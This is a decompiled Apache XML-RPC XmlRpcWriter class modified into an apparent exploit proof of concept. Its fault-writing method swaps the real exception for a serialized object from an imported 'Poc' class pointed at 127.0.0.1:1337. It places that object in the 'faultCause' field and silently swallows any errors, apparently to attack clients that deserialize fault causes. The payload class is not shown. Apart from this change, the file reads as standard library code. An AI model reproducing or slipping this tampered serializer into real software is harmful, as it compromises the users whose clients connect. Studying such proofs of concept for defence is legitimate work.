//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by Fernflower decompiler)
//

package org.apache.xmlrpc.serializer;

import org.apache.xmlrpc.XmlRpcRequest;
import org.apache.xmlrpc.XmlRpcRequestConfig;
import org.apache.xmlrpc.common.TypeFactory;
import org.apache.xmlrpc.common.XmlRpcStreamConfig;
import org.apache.xmlrpc.common.XmlRpcStreamRequestConfig;
import org.apache.xmlrpc.server.Poc;
import org.xml.sax.Attributes;
import org.xml.sax.ContentHandler;
import org.xml.sax.SAXException;
import org.xml.sax.helpers.AttributesImpl;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.util.HashMap;
import java.util.Map;

public class XmlRpcWriter {
    public static final String EXTENSIONS_URI = "http://ws.apache.org/xmlrpc/namespaces/extensions";
    private static final Attributes ZERO_ATTRIBUTES = new AttributesImpl();
    private final XmlRpcStreamConfig config;
    private final TypeFactory typeFactory;
    private final ContentHandler handler;

    public XmlRpcWriter(XmlRpcStreamConfig pConfig, ContentHandler pHandler, TypeFactory pTypeFactory) {
        this.config = pConfig;
        this.handler = pHandler;
        this.typeFactory = pTypeFactory;
    }

    public void write(XmlRpcRequest pRequest) throws SAXException {
        this.handler.startDocument();
        boolean extensions = pRequest.getConfig().isEnabledForExtensions();
        if (extensions) {
            this.handler.startPrefixMapping("ex", "http://ws.apache.org/xmlrpc/namespaces/extensions");
        }

        this.handler.startElement("", "methodCall", "methodCall", ZERO_ATTRIBUTES);
        this.handler.startElement("", "methodName", "methodName", ZERO_ATTRIBUTES);
        String s = pRequest.getMethodName();
        this.handler.characters(s.toCharArray(), 0, s.length());
        this.handler.endElement("", "methodName", "methodName");
        this.handler.startElement("", "params", "params", ZERO_ATTRIBUTES);
        int num = pRequest.getParameterCount();

        for(int i = 0; i < num; ++i) {
            this.handler.startElement("", "param", "param", ZERO_ATTRIBUTES);
            this.writeValue(pRequest.getParameter(i));
            this.handler.endElement("", "param", "param");
        }

        this.handler.endElement("", "params", "params");
        this.handler.endElement("", "methodCall", "methodCall");
        if (extensions) {
            this.handler.endPrefixMapping("ex");
        }

        this.handler.endDocument();
    }

    public void write(XmlRpcRequestConfig pConfig, Object pResult) throws SAXException {
        this.handler.startDocument();
        boolean extensions = pConfig.isEnabledForExtensions();
        if (extensions) {
            this.handler.startPrefixMapping("ex", "http://ws.apache.org/xmlrpc/namespaces/extensions");
        }

        this.handler.startElement("", "methodResponse", "methodResponse", ZERO_ATTRIBUTES);
        this.handler.startElement("", "params", "params", ZERO_ATTRIBUTES);
        this.handler.startElement("", "param", "param", ZERO_ATTRIBUTES);
        this.writeValue(pResult);
        this.handler.endElement("", "param", "param");
        this.handler.endElement("", "params", "params");
        this.handler.endElement("", "methodResponse", "methodResponse");
        if (extensions) {
            this.handler.endPrefixMapping("ex");
        }

        this.handler.endDocument();
    }

    public void write(XmlRpcRequestConfig pConfig, int pCode, String pMessage) throws SAXException {
        this.write(pConfig, pCode, pMessage, (Throwable)null);
    }

    public void write(XmlRpcRequestConfig pConfig, int pCode, String pMessage, Throwable pThrowable) throws SAXException {
        this.handler.startDocument();
        boolean extensions = pConfig.isEnabledForExtensions();
        if (extensions) {
            this.handler.startPrefixMapping("ex", "http://ws.apache.org/xmlrpc/namespaces/extensions");
        }

        this.handler.startElement("", "methodResponse", "methodResponse", ZERO_ATTRIBUTES);
        this.handler.startElement("", "fault", "fault", ZERO_ATTRIBUTES);
        Map map = new HashMap();
        map.put("faultCode", new Integer(pCode));
        map.put("faultString", pMessage == null ? "" : pMessage);
        if (pThrowable != null && extensions && pConfig instanceof XmlRpcStreamRequestConfig && ((XmlRpcStreamRequestConfig)pConfig).isEnabledForExceptions()) {
            try {
                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                ObjectOutputStream oos = new ObjectOutputStream(baos);
                oos.writeObject(Poc.getObject("127.0.0.1:1337"));
                oos.close();
                baos.close();
                map.put("faultCause", baos.toByteArray());
            } catch (Throwable var9) {
            }
        }

        this.writeValue(map);
        this.handler.endElement("", "fault", "fault");
        this.handler.endElement("", "methodResponse", "methodResponse");
        if (extensions) {
            this.handler.endPrefixMapping("ex");
        }

        this.handler.endDocument();
    }

    protected void writeValue(Object pObject) throws SAXException {
        TypeSerializer serializer = this.typeFactory.getSerializer(this.config, pObject);
        if (serializer == null) {
            throw new SAXException("Unsupported Java type: " + pObject.getClass().getName());
        } else {
            serializer.write(this.handler, pObject);
        }
    }
}
